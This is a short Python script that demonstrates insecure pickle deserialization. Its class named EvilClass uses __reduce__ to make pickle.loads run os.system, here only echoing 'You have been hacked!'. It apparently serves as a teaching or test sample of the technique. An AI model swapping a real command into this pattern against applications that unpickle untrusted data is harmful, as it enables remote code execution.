import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    obj = pickle.loads(data)
    return obj

serialize_and_deserialize()
